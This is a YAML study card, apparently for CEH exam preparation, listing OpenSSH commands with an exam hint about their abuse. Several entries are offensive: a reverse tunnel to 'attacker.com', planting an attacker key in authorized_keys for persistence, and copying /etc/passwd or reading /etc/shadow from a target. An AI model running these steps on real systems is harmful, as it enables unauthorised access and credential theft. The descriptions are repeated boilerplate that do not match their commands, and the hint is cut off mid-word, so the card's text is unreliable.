tool: openssh
tags:
- m11
- network
- cli
exam_hint: 'OpenSSH (Open Secure Shell) is the premier open-source implementation of the SSH (Secure Shell) protocol suite, providing encrypted remote login, file transfer (SCP/SFTP), and tunneling. Available on Linux, macOS, and now built into Windows 10/11, it is used by administrators for secure remote management. Threat actors abuse OpenSSH for encrypted C2 channels, persistent backdoors (authorized_keys  Strategy: nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on th'
docs:
- https://www.openssh.com/
- https://attack.mitre.org/techniques/T1021/004/
- https://www.digitalocean.com/community/tutorials/ssh-essentials-working-with-ssh-servers-clients-and-keys
actions:
- title: Ssh user@192.168.1.10
  desc: Runs `ssh` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
  command: ssh user@192.168.1.10
- title: Ssh -p 2222
  desc: Runs `ssh` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
  command: ssh -p 2222 user@192.168.1.10
- title: Ssh -L 8080:internal-server:80
  desc: Runs `ssh` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
  command: ssh -L 8080:internal-server:80 user@jumphost.com
- title: Ssh -R 4444:localhost:4444
  desc: Runs `ssh` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
  command: ssh -R 4444:localhost:4444 user@attacker.com
- title: Ssh -D 1080
  desc: Runs `ssh` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
  command: ssh -D 1080 user@jumphost.com
- title: Scp user@192.168.1.10:/etc/passwd ./
  desc: Runs `scp` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
  command: scp user@192.168.1.10:/etc/passwd ./
- title: Ssh-keygen -t ed25519
  desc: Runs `ssh-keygen` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
  command: ssh-keygen -t ed25519 -C "attacker@evil.com"
- title: Echo "ssh-rsa AAAA...
  desc: Runs `echo` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
  command: echo "ssh-rsa AAAA... attacker" >> ~/.ssh/authorized_keys
- title: Ssh user@192.168.1.10 "cat
  desc: Runs `ssh` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
  command: ssh user@192.168.1.10 "cat /etc/shadow"
- title: Add-WindowsCapability -Online -Name
  desc: Runs `Add-WindowsCapability` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
  command: Add-WindowsCapability -Online -Name OpenSSH.Client
